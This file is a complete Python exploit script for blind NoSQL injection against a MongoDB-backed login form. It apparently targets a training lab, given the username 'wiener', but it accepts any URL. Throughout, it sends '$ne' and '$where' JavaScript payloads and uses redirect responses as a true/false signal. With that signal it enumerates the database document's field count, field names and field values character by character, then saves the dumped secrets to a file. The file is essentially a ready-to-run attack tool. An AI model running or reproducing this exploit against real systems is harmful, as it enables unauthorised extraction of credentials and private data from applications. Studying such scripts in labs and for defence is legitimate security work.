#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string, argparse, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def make_request(url, payload, proxy_url=None):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    proxies = None
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    
    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            proxies=proxies,
            verify=False,
            timeout=300,
            allow_redirects=False
        )
        return response.status_code == 302
    except requests.exceptions.RequestException as e:
        log.error(f"Error during request: {e}")
        return False

def escape_regex_character(character):
    if character == '\\':
        return '\\\\\\\\'
    elif character in '.^$*+?{}[]|()':
        return '\\\\' + character
    return character

def get_field_count(url, field_count, proxy_url=None):
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(Object.keys(this).length=={field_count}) return 1; else return 0; }}"
    }
    return make_request(url, payload, proxy_url), payload

def get_field_length(url, field_index, length, proxy_url=None):
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
    }
    return make_request(url, payload, proxy_url), payload

def get_field_value_length(url, field_name, length, proxy_url=None):
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(this.{field_name}.valueOf().toString().length == {length}) return 1; else return 0; }}"
    }
    return make_request(url, payload, proxy_url), payload

def enumerate_field_lengths(url, total_fields, proxy_url=None):
    field_lengths_list = []
    print()
    progress_bar = log.progress("Enumerating field lengths")
    
    for current_field_index in range(total_fields):
        current_length = 0
        length_found = False
        
        while not length_found:
            result, payload = get_field_length(url, current_field_index, current_length, proxy_url)
            progress_bar.status(payload["$where"])
            if result:
                field_lengths_list.append(current_length)
                length_found = True
                log.success(f"Field {current_field_index}: {current_length}")
            else:
                current_length += 1
    
    progress_bar.success("Completed")
    return field_lengths_list

def enumerate_field_value_lengths(url, field_names_list, field_indexes, proxy_url=None):
    field_value_lengths = {}
    print()
    progress_bar = log.progress("Enumerating field value lengths")
    
    for current_field_index in field_indexes:
        current_field_name = field_names_list[current_field_index]
        if current_field_name is None:
            log.warning(f"Skipping field (invalid name)")
            field_value_lengths[current_field_name] = None
            continue
        
        current_value_length = 0
        value_length_found = False
        
        while not value_length_found:
            result, payload = get_field_value_length(url, current_field_name, current_value_length, proxy_url)
            progress_bar.status(payload["$where"])
            
            if result:
                field_value_lengths[current_field_name] = current_value_length
                value_length_found = True
                log.success(f"Field {current_field_index}: {current_value_length}")
            else:
                current_value_length += 1
    
    progress_bar.success("Completed")
    return field_value_lengths

def get_field_char(url, field_index, position, character, proxy_url=None):
    escaped_character = escape_regex_character(character)
    
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
    }
    return make_request(url, payload, proxy_url), payload

def get_field_value_char(url, field_name, position, character, proxy_url=None):
    escaped_character = escape_regex_character(character)
    
    payload = {
        "username": "wiener",
        "password": {
            "$ne": ""
        },
        "$where": f"function(){{ if(this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
    }
    return make_request(url, payload, proxy_url), payload

def enumerate_field_names(url, field_lengths_list, proxy_url=None):
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    field_names_list = []
    print()
    progress_bar = log.progress("Enumerating field names")
    
    for current_field_index, current_field_length in enumerate(field_lengths_list):
        if current_field_length is None or current_field_length == 0:
            log.warning(f"Skipping field {current_field_index} (invalid length)")
            field_names_list.append(None)
            continue
        
        progress_bar.status(f"Extracting field {current_field_index}/{len(field_lengths_list)-1} (length: {current_field_length})")
        extracted_field_name = ""
        field_progress_bar = log.progress(f"Field {current_field_index}")
        
        for current_position in range(current_field_length):
            character_found = None
            
            for character in characters:
                result, payload = get_field_char(url, current_field_index, current_position, character, proxy_url)
                progress_bar.status(payload["$where"])
                
                if result:
                    extracted_field_name += character
                    character_found = character
                    field_progress_bar.status(extracted_field_name)
                    break
            
            if character_found is None:
                log.warning(f"Could not find character at position {current_position} for field {current_field_index}")
                extracted_field_name += "?"
                field_progress_bar.status(extracted_field_name)
        
        field_names_list.append(extracted_field_name)
        field_progress_bar.success(extracted_field_name)
    
    progress_bar.success("Completed")
    return field_names_list

def enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes, proxy_url=None):
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    field_values = {}
    print()
    progress_bar = log.progress("Enumerating field values")
    
    for current_field_index in field_indexes:
        current_field_name = field_names_list[current_field_index]
        if current_field_name is None:
            log.warning(f"Skipping field (invalid name)")
            field_values[current_field_name] = None
            continue
        
        current_value_length = field_value_lengths.get(current_field_name)
        if current_value_length is None or current_value_length == 0:
            log.warning(f"Skipping field {current_field_index} (invalid value length)")
            field_values[current_field_name] = None
            continue
        
        progress_bar.status(f"Extracting value for field {current_field_index} (length: {current_value_length})")
        extracted_field_value = ""
        field_progress_bar = log.progress(f"Field {current_field_index}")
        
        for current_position in range(current_value_length):
            character_found = None
            
            for character in characters:
                result, payload = get_field_value_char(url, current_field_name, current_position, character, proxy_url)
                progress_bar.status(payload["$where"])
                
                if result:
                    extracted_field_value += character
                    character_found = character
                    field_progress_bar.status(extracted_field_value)
                    break
            
            if character_found is None:
                log.warning(f"Could not find character at position {current_position} for field {current_field_index}")
                extracted_field_value += "?"
                field_progress_bar.status(extracted_field_value)
        
        field_values[current_field_name] = extracted_field_value
        field_progress_bar.success(extracted_field_value)
    
    progress_bar.success("Completed")
    return field_values

def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
    if proxy_url:
        log.info(f"Using proxy: {proxy_url}")
    
    progress_bar = log.progress("Enumerating number of fields")
    progress_bar.status("Starting brute-force attack")
    total_fields_found = None
    count = 0
    
    while total_fields_found is None:
        result, payload = get_field_count(url, count, proxy_url)
        progress_bar.status(payload["$where"])
        
        if result:
            total_fields_found = count
            log.success(f"Fields found: {count}")
            break
        count += 1
    
    progress_bar.success(f"Completed")
    
    field_lengths_list = enumerate_field_lengths(url, total_fields_found, proxy_url)
    field_names_list = enumerate_field_names(url, field_lengths_list, proxy_url)
    
    field_indexes = []
    while not field_indexes:
        print()
        user_input = input(f"[?] Enter field indexes to dump (0-{total_fields_found-1}, comma-separated) or 'all' for all fields: ").strip()
        
        if user_input.lower() == 'all':
            field_indexes = [i for i, name in enumerate(field_names_list) if name is not None]
            break
        else:
            try:
                indexes = [int(idx.strip()) for idx in user_input.split(',')]
                valid_indexes = []
                invalid_index_found = False
                
                for index in indexes:
                    if 0 <= index < len(field_names_list) and field_names_list[index] is not None:
                        valid_indexes.append(index)
                    else:
                        log.warning(f"Invalid or unavailable field index: {index}")
                        invalid_index_found = True
                
                if invalid_index_found:
                    log.warning("Please enter only valid field indexes.")
                    continue
                
                if valid_indexes:
                    field_indexes = valid_indexes
                else:
                    log.warning("No valid field indexes selected. Please try again.")
            except ValueError:
                log.warning("Invalid input. Please enter numbers separated by commas or 'all'.")
    
    field_value_lengths = enumerate_field_value_lengths(url, field_names_list, field_indexes, proxy_url)
    
    field_values = enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes, proxy_url)
    
    has_valid_results = False
    for field_index in field_indexes:
        field_name = field_names_list[field_index]
        if field_name is not None:
            has_valid_results = True
            break
    
    if has_valid_results:
        print()
        log.info("Fields and values")
        for field_index in field_indexes:
            field_name = field_names_list[field_index]
            field_value = field_values.get(field_name, None)
            if field_name is not None and field_value is not None:
                log.info(f"{field_name}:{field_value}")
            else:
                log.warning(f"Field {field_index}: Could not be determined")
        
        with open(output_file, 'w') as file_handler:
            for field_index in field_indexes:
                field_name = field_names_list[field_index]
                field_value = field_values.get(field_name, None)
                if field_name is not None and field_value is not None:
                    file_handler.write(f"{field_name}:{field_value}\n")
                else:
                    file_handler.write(f"Field {field_index}: Could not be determined\n")
        
        log.info(f"Results saved to {output_file}")
    else:
        log.warning("No valid results found. File not created.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='MongoDB Fields Enumeration via NoSQL Injection',
        add_help=False
    )
    parser.add_argument('-h', '--help', action='help', help='Show this help message and exit')
    parser.add_argument('-u', '--url', required=True, metavar='', help='Target URL (e.g. https://example.com/login)')
    parser.add_argument('-p', '--proxy', metavar='', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument('-o', '--output', default='fields.txt', metavar='', help='Output file (default: fields.txt)')
    
    args = parser.parse_args()
    
    execute_nosql_enumeration(url=args.url, proxy_url=args.proxy, output_file=args.output)
